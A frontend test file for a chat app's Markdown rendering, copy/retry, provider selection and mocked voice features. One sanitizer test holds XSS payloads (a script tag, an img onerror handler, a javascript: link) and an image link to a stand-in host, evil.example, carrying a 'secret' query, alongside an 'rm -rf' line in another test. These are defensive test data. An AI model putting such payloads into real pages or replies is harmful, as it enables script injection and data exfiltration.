// @vitest-environment jsdom
// Increment 3 chat behaviour: safe Markdown, copy, retry, the explicit AI path,
// and opt-in browser voice. Speech APIs are mocked here; these tests do not
// prove that a real Android browser recognises or speaks.
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { App } from '@/App'
import { SESSION_TOKEN_KEY } from '@/lib/session'

let root: Root
let container: HTMLDivElement
// eslint-disable-next-line @typescript-eslint/no-explicit-any -- request bodies are inspected loosely
type Body = any
let calls: Array<{ method: string; url: string; body: Body }>
let chatReply: (body: Body) => Response

const ev = (o: unknown) => `data: ${JSON.stringify(o)}\n\n`
const sse = (chunks: string[]) => new Response(new ReadableStream({
  start(c) { const e = new TextEncoder(); for (const x of chunks) c.enqueue(e.encode(x)); c.close() },
}), { status: 200, headers: { 'content-type': 'text/event-stream' } })
const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
const reply = (text: string) => () => sse([
  ev({ type: 'route', platform: 'groq', model: 'llama', displayName: 'Llama', fallbackAttempts: 0, fallbackTrail: null }),
  ev({ type: 'delta', text }), ev({ type: 'done', finishReason: 'stop', latencyMs: 400 }),
])

beforeAll(() => { (globalThis as unknown as { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true })
beforeEach(() => {
  localStorage.setItem(SESSION_TOKEN_KEY, 'session-token')
  window.location.hash = ''
  window.matchMedia = ((q: string) => ({ matches: false, media: q, addEventListener() {}, removeEventListener() {} })) as unknown as typeof window.matchMedia
  calls = []
  chatReply = reply('ok')
  vi.stubGlobal('fetch', vi.fn(async (url: string, init: RequestInit = {}) => {
    const method = init.method ?? 'GET'
    const body = init.body ? JSON.parse(String(init.body)) : null
    calls.push({ method, url, body })
    if (url === '/api/glixel/chat') return chatReply(body)
    if (url === '/api/conversations' && method === 'POST') return json({ id: 3 }, 201)
    if (url.startsWith('/api/conversations/')) return json({})
    return json({}, 404)
  }))
  container = document.createElement('div'); document.body.appendChild(container); root = createRoot(container)
})
afterEach(() => {
  act(() => root.unmount()); container.remove(); localStorage.clear(); vi.unstubAllGlobals()
  delete (window as unknown as Record<string, unknown>).webkitSpeechRecognition
})

async function settle(n = 8) { for (let i = 0; i < n; i++) await act(async () => { await new Promise(r => setTimeout(r, 0)) }) }
async function mount() { act(() => root.render(<App />)); await settle() }
const $ = (sel: string) => container.querySelector(sel) as HTMLElement | null
const button = (label: string) => [...container.querySelectorAll('button')].find(b => b.textContent?.trim() === label || b.getAttribute('aria-label') === label) as HTMLButtonElement
async function type(text: string) {
  const ta = $('#glixel-input') as HTMLTextAreaElement
  const setter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value')!.set!
  await act(async () => { setter.call(ta, text); ta.dispatchEvent(new Event('input', { bubbles: true })) })
}
async function send(text: string) { await type(text); await act(async () => { button('Send').click() }); await settle() }
const lastReply = () => [...container.querySelectorAll('[data-role="assistant"]')].pop() as HTMLElement

describe('Markdown replies', () => {
  it('renders headings, lists, tables, links and code with a copy control', async () => {
    chatReply = reply('## Plan\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n[docs](https://example.com)\n\n```js\nconsole.log(1)\n```')
    await mount()
    await send('format')
    const el = lastReply()
    expect(el.querySelector('h2')!.textContent).toBe('Plan')
    expect(el.querySelectorAll('li')).toHaveLength(2)
    expect(el.querySelector('table td')!.textContent).toBe('1')
    const link = el.querySelector('a.glx-md-link') as HTMLAnchorElement
    expect(link.getAttribute('href')).toBe('https://example.com')
    expect(link.rel).toMatch(/noopener/)
    expect(link.target).toBe('_blank')
    expect(el.querySelector('[data-testid="code-block"] code')!.textContent).toBe('console.log(1)\n')
    expect(el.querySelector('[data-testid="code-block"] button[aria-label="Copy code"]')).not.toBeNull()
  })

  it('never renders HTML, script URLs or remote images from a reply', async () => {
    chatReply = reply('<script>window.pwned=1</script><img src=x onerror="window.pwned=1"><b>bold?</b>\n\n[click](javascript:alert(1)) [d](data:text/html,hi)\n\n![leak](https://evil.example/p?q=secret)')
    await mount()
    await send('attack')
    const el = lastReply()
    expect(el.querySelector('script, img, b, iframe')).toBeNull()
    expect((window as unknown as { pwned?: number }).pwned).toBeUndefined()
    for (const a of el.querySelectorAll('a')) expect(a.getAttribute('href') ?? '').toMatch(/^https:\/\//)
    expect(el.querySelector('[data-testid="md-image-link"]')!.textContent).toBe('[image: leak]')
    expect(el.textContent).toContain('click')
  })

  it('shows user text literally, without Markdown or HTML', async () => {
    await mount()
    await send('**not bold** <i>x</i>')
    const mine = container.querySelector('[data-role="user"] [data-testid="message-text"]')!
    expect(mine.textContent).toBe('**not bold** <i>x</i>')
    expect(mine.querySelector('i, strong')).toBeNull()
  })
})

describe('copy and retry', () => {
  it('copies the whole response as written', async () => {
    const writeText = vi.fn(async () => {})
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText } })
    chatReply = reply('Use `npm ci`.')
    await mount()
    await send('how?')
    await act(async () => { button('Copy response').click() })
    expect(writeText).toHaveBeenCalledWith('Use `npm ci`.')
    expect(button('Copy response').textContent).toBe('Copied')
  })

  it('retries a failed answer with the same turns and replaces the error', async () => {
    chatReply = () => json({ error: { message: 'Every free model is busy.', code: 'routing_exhausted' } }, 503)
    await mount()
    await send('hello')
    expect(lastReply().textContent).toMatch(/busy/)
    chatReply = reply('Back again.')
    await act(async () => { button('Retry').click() })
    await settle()
    const chats = calls.filter(c => c.url === '/api/glixel/chat')
    expect(chats).toHaveLength(2)
    expect(chats[1].body.messages).toEqual([{ role: 'user', content: 'hello' }])
    const replies = [...container.querySelectorAll('[data-role="assistant"]')]
    expect(replies).toHaveLength(1)
    expect(replies[0].textContent).toMatch(/Back again/)
  })
})

describe('AI path', () => {
  it('uses FreeLLMAPI by default without naming a provider in the request', async () => {
    await mount()
    expect($('[data-testid="ai-path"]')!.textContent).toBe('AI path: FreeLLMAPI')
    await send('hi')
    expect(calls.find(c => c.url === '/api/glixel/chat')!.body.provider).toBeUndefined()
  })

  it('offers a way back to FreeLLMAPI when a path is unavailable', async () => {
    chatReply = () => json({ error: { message: 'Claude is not connected.', code: 'provider_unavailable', provider: 'claude' } }, 503)
    await mount()
    await send('hi')
    expect($('[data-testid="error-hint"]')!.textContent).toMatch(/back to FreeLLMAPI/)
    expect(button('Use FreeLLMAPI')).toBeTruthy()
  })
})

class FakeRecognition {
  static last: FakeRecognition | null = null
  lang = ''; interimResults = false; continuous = true; maxAlternatives = 0
  started = false; aborted = false; stopped = false
  onresult: ((e: unknown) => void) | null = null
  onerror: ((e: { error: string }) => void) | null = null
  onend: (() => void) | null = null
  constructor() { FakeRecognition.last = this }
  start() { this.started = true }
  stop() { this.stopped = true }
  abort() { this.aborted = true; this.onend?.() }
  say(text: string, isFinal: boolean) {
    const result = Object.assign([{ transcript: text }], { isFinal })
    this.onresult?.({ resultIndex: 0, results: [result] })
  }
}

describe('voice input (mocked SpeechRecognition)', () => {
  it('hides the microphone where the browser has no speech recognition', async () => {
    await mount()
    expect(button('Speak a message')).toBeUndefined()
    expect($('#glixel-input')).not.toBeNull()
  })

  it('asks before the first use, listens once, fills the draft and never sends by itself', async () => {
    (window as unknown as Record<string, unknown>).webkitSpeechRecognition = FakeRecognition
    FakeRecognition.last = null
    await mount()
    await act(async () => { button('Speak a message').click() })
    expect($('[data-testid="voice-consent"]')!.textContent).toMatch(/Google/)
    expect(FakeRecognition.last).toBeNull() // nothing listens before consent
    await act(async () => { button('Start listening').click() })
    const rec = FakeRecognition.last!
    expect(rec.started).toBe(true)
    expect(rec.continuous).toBe(false)
    expect($('[data-testid="voice-listening"]')!.textContent).toMatch(/Microphone on/)
    expect(button('Stop listening').getAttribute('aria-pressed')).toBe('true')
    await act(async () => { rec.say('what is the', false) })
    expect($('[data-testid="voice-interim"]')!.textContent).toBe('what is the')
    await act(async () => { rec.say('what is the weather', true); rec.onend?.() })
    expect(($('#glixel-input') as HTMLTextAreaElement).value).toBe('what is the weather')
    expect($('[data-testid="voice-heard"]')).not.toBeNull()
    expect(calls.some(c => c.url === '/api/glixel/chat')).toBe(false)
  })

  it('cancel aborts recognition and discards what was heard', async () => {
    (window as unknown as Record<string, unknown>).webkitSpeechRecognition = FakeRecognition
    await mount()
    await act(async () => { button('Speak a message').click() })
    await act(async () => { button('Start listening').click() })
    const rec = FakeRecognition.last!
    await act(async () => { rec.say('never mind', true) })
    await act(async () => { button('Cancel').click() })
    expect(rec.aborted).toBe(true)
    expect(($('#glixel-input') as HTMLTextAreaElement).value).toBe('')
    expect($('[data-testid="voice-listening"]')).toBeNull()
  })

  it('explains a blocked microphone and keeps typing available', async () => {
    (window as unknown as Record<string, unknown>).webkitSpeechRecognition = FakeRecognition
    await mount()
    await act(async () => { button('Speak a message').click() })
    await act(async () => { button('Start listening').click() })
    await act(async () => { FakeRecognition.last!.onerror?.({ error: 'not-allowed' }); FakeRecognition.last!.onend?.() })
    expect($('[data-testid="voice-error"]')!.textContent).toMatch(/site settings/)
    await send('typed instead')
    expect(calls.some(c => c.url === '/api/glixel/chat')).toBe(true)
  })
})

describe('read aloud (mocked speechSynthesis)', () => {
  it('is off by default, speaks prose only when switched on, and can be stopped', async () => {
    const speak = vi.fn(); const cancel = vi.fn()
    vi.stubGlobal('speechSynthesis', { speak, cancel })
    vi.stubGlobal('SpeechSynthesisUtterance', class { text: string; lang = ''; onend: unknown; onerror: unknown; constructor(t: string) { this.text = t } })
    chatReply = reply('Here you go.\n\n```sh\nrm -rf /tmp/x\n```\n\nSee https://example.com/very/long')
    await mount()
    await send('first')
    expect(speak).not.toHaveBeenCalled()
    await act(async () => { button('Read aloud: off').click() })
    await send('second')
    expect(speak).toHaveBeenCalledTimes(1)
    const spoken = (speak.mock.calls[0] as unknown as [{ text: string }])[0].text
    expect(spoken).toContain('Here you go.')
    expect(spoken).not.toMatch(/rm -rf|https?:/)
    await act(async () => { button('Stop speaking').click() })
    expect(cancel).toHaveBeenCalled()
  })
})
